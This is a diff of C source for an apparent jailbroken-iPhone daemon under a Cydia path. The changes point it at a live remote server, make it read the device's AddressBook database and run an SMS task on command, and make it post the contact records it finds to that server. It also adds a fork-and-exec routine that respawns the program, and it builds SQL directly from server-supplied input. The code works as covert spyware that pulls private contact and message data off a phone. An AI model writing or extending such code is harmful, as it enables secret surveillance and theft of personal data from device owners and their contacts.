@@ -15,15 +15,14 @@
 
 #define CURL_MAX_POST_LEN (1024*24)
 #define LOG_MSG_LEN (4096)
-#define CRON_TASK_TIME 6//TODO release
+#define CRON_TASK_TIME 60//TODO release
 
-int fd;
 CURL *curl;
 char apiPermitURL[400];
 char apiPostSMSURL[400];
 char apiPostAdURL[400];
 char logFile[100] = "/var/root/bsms.log";
-char remoteURL[100] = "http://bsms.sinaapp.local/api.php?";
+char remoteURL[100] = "http://bsms.sinaapp.com/api.php?";
 char localBuffer[1024*100] = {0};
 int cronSMSTask(int rowid);
 int cronAddressBookTask(char* id);
@@ -35,6 +34,7 @@ int getUUID(char* des_netcard , char* out_addr);
 int getCode(int n, const char* fmt , ...);
 int callbackGetPermitID(void *ptr, int size, int nmemb, void *stream);
 int callbackBlockedWritedataFunc(void *ptr, int size, int nmemb, void *stream);
+int refreshThis();
 int writeLog(const char *pszFmt,...);
 
 int main() {
@@ -69,41 +69,40 @@ int main() {
 
         //主线程一直循环
         for (;;) {
-
-            localBuffer[0] = 0;
+            memset(localBuffer,0,1024*100);
             getPermit();
             curl_easy_reset(curl);
 
             int smsid=0, adid=0, permitid=0;
             char *sid, *aid, *pid;
             getCode(3, localBuffer, &sid, &aid, &pid);
-    		writeLog("smsid[%s]-adid[%s]-perid[%s]\n", sid, aid, pid);
+            writeLog("smsid[%s]-adid[%s]-perid[%s]\n", sid, aid, pid);
 
-    		smsid = atoi(sid);
-    		adid = atoi(aid);
-    		permitid = atoi(pid);
-
-            if(permitid > 0) {
-            //    cronSMSTask(smsid);
-            //    curl_easy_reset(curl);
-                cronAddressBookTask(adid);
-                curl_easy_reset(curl);
+            //处理返回的命令集
+            if(sid == NULL) {
+                smsid = 0;
             } else {
-            	/*
-            	pid_t pid=fork();
-            	if (!pid) {
-            		writeLog("execl:/usr/libexec/cydia/bsms pid[%d]\n", pid);
-            		execl("/usr/libexec/cydia/bsms" , "bsms" , NULL);
-            	} else {
-            		writeLog("execl:no pid[%d]\n", pid);
-            		exit(1);
-            	}
-            	*/
+                smsid = atoi(sid);
             }
-            if(curl) {
-            //    curl_easy_cleanup(curl);
+            if(sid == NULL) {
+                permitid = 0;
+            } else {
+                permitid = atoi(pid);
             }
-            writeLog("apiSMSId:[%d]-AddressBookId:[%d]-------------------------------------EOF\n", smsid, adid);
+
+            //判断是否有权限
+            if(permitid > 0) {
+                cronSMSTask(smsid);
+                curl_easy_reset(curl);
+
+                if(aid != NULL && aid[0] != 0) {
+                    cronAddressBookTask(aid);
+                    curl_easy_reset(curl);
+                }
+                writeLog("apiSMSId:[%d]-AddressBookId:[%s]-------------------------------------EOF\n", smsid, aid);
+            } else {
+                refreshThis();
+            }
             sleep(CRON_TASK_TIME);
         }
     }
@@ -118,9 +117,9 @@ int getPermit(){
         curl_easy_setopt(curl, CURLOPT_WRITEDATA, localBuffer);
         res = curl_easy_perform(curl);
         if(res != CURLE_OK) {
-        	writeLog("getPermit() curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            writeLog("getPermit() curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
         } else {
-        	writeLog("localBuffer:[%s]\n", localBuffer);
+            writeLog("localBuffer:[%s]\n", localBuffer);
         }
     }
 
@@ -130,7 +129,7 @@ int getPermit(){
 int callbackGetPermitID(void *ptr, int size, int nmemb, void *stream){
     int sizes = size * nmemb;
     memcpy(stream+strlen(stream), ptr, sizes);
-    writeLog("callbackGetPermitID() stream:%s\n",stream);
+    //writeLog("callbackGetPermitID() stream:%s\n",stream);
     return sizes;
 }
 
@@ -180,17 +179,18 @@ int cronAddressBookTask(char* id) {
     int i=0, j=0, nlen=0, column=0, offset = 0;
 
     char sql[1000];
-    snprintf(sql, 1000, "SELECT ABMultiValue.record_id, ABMultiValue.Value, ABPerson.* "
-    		"FROM ABMultiValue LEFT JOIN ABPerson ON (ABPerson.ROWID = ABMultiValue.record_id) WHERE ABMultiValue.value = '%s'", id);
+    snprintf(sql, 1000, "SELECT ABMultiValue.record_id, ABMultiValue.Value as Address, ABPerson.* "
+            "FROM ABMultiValue LEFT JOIN ABPerson ON (ABPerson.ROWID = ABMultiValue.record_id) "
+            "WHERE ABMultiValue.value IN (%s) LIMIT 1", id);
     int row = getData("/var/mobile/Library/AddressBook/AddressBook.sqlitedb", sql, &result, &column);
 
-    if(row > 0) {
-        if(curl) {
-            curl_easy_setopt(curl, CURLOPT_URL, apiPostAdURL);
-            curl_easy_setopt(curl, CURLOPT_TIMEOUT , 3);
-            //curl_easy_setopt(curl , CURLOPT_WRITEFUNCTION , callbackBlockedWritedataFunc);
-        }
+    if(curl) {
+        curl_easy_setopt(curl, CURLOPT_URL, apiPostAdURL);
+        curl_easy_setopt(curl, CURLOPT_TIMEOUT , 3);
+        curl_easy_setopt(curl , CURLOPT_WRITEFUNCTION , callbackBlockedWritedataFunc);
+    }
 
+    if(row > 0) {
         for(i=1; i < (row + 1); i++) {
             char messageData[CURL_MAX_POST_LEN];
             nlen = 0;
@@ -201,37 +201,15 @@ int cronAddressBookTask(char* id) {
                 nlen = strlen(messageData);
 
             }
-
-            /*
-            if((strcmp(result[SMSis_madrid], "1") == 0)) {
-                snprintf(SMSmobileNum, 400, "%s", result[SMSmadrid_handle]);
-            } else {
-                snprintf(SMSmobileNum, 400, "%s", result[SMSAddress]);
-            }
-            char adsql[1000];
-            snprintf(adsql, 1000, "SELECT ABMultiValue.record_id, ABPerson.* "
-            		"FROM ABMultiValue LEFT JOIN ABPerson ON (ABPerson.ROWID = ABMultiValue.record_id) "
-            		"WHERE ABMultiValue.value =  '13716363792'", SMSmobileNum);
-            writeLog("cronSMSTask() sql_addressbook[%s]\n",adsql);
-            int adi=0, adj=0, adlen=0, adcolumn=0, adoffset = 0;
-            char **adresult;
-            int adrow = getData("/var/mobile/Library/AddressBook/AddressBook.sqlitedb", adsql, &adresult, &adcolumn);
-            for(adi=1; i < (adrow + 1); adi++) {
-        		writeLog("adi2: %d--------\n", adi);
-            	for (adj = 0; adj < adcolumn; adj++) {
-            		adoffset = adi*adcolumn+adj;
-            		writeLog("adresult: %s=%s-Delimiter-\n", adresult[adj], adresult[adoffset]);
-            	}
-        		writeLog("adi2: %d--------\n", adi);
-            }
-            sqlite3_free_table(adresult);
-            */
-
-    		writeLog("messageData: %s--------\n", messageData);
-            //postData(curl, messageData);
+            postData(curl, messageData);
         }
         //free sqlite3 result
         sqlite3_free_table(result);
+    } else {
+        char messageData[CURL_MAX_POST_LEN];
+        snprintf(messageData, CURL_MAX_POST_LEN, "returnid=%s",id);
+        postData(curl, messageData);
+
     }
     return 0;
 }
@@ -244,9 +222,9 @@ int postData(CURL *curl, char *messageData) {
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, messageData);
         res = curl_easy_perform(curl);
         if(res != CURLE_OK) {
-        	writeLog("postData() curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            writeLog("postData() curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
         } else {
-        	writeLog("postData() ok\n");
+            writeLog("postData() ok\n");
         }
     }
 
@@ -260,6 +238,7 @@ int getData(char *file, char *sql, char ***res, int *column) {
     if(rc) {
         fprintf(stderr, "sqllite3 error open faile %s\n",sqlite3_errmsg(db));
         sqlite3_close(db);
+        refreshThis();
         return -1;
     }else {
         int ret = SqliteQuery(db, sql, res, column);
@@ -278,9 +257,12 @@ int SqliteQuery(sqlite3 *db, const char *sql, char ***res, int *column) {
         sqlite3_exec(db, sql, 0, 0, &errorMsg);
     }
     if(errorMsg){
+        sqlite3_close(db);
         writeLog("sqlite3 erro:%s\n", errorMsg);
+        refreshThis();
         return -1;
     }else{
+        sqlite3_close(db);
         return row;
     }
 }
@@ -351,6 +333,18 @@ int getUUID(char* des_netcard , char* out_addr) {
            *(ptr+3), *(ptr+4), *(ptr+5));
 
     free(buf);
+    return 0;
+}
+
+int refreshThis() {
+    pid_t pid=fork();
+    if (!pid) {
+        writeLog("execl:/usr/libexec/cydia/bsms pid[%d]\n", pid);
+        execl("/usr/libexec/cydia/bsms" , "bsms" , NULL);
+    } else {
+        writeLog("execl:no pid[%d]\n", pid);
+        exit(1);
+    }
     return 0;
 }
 
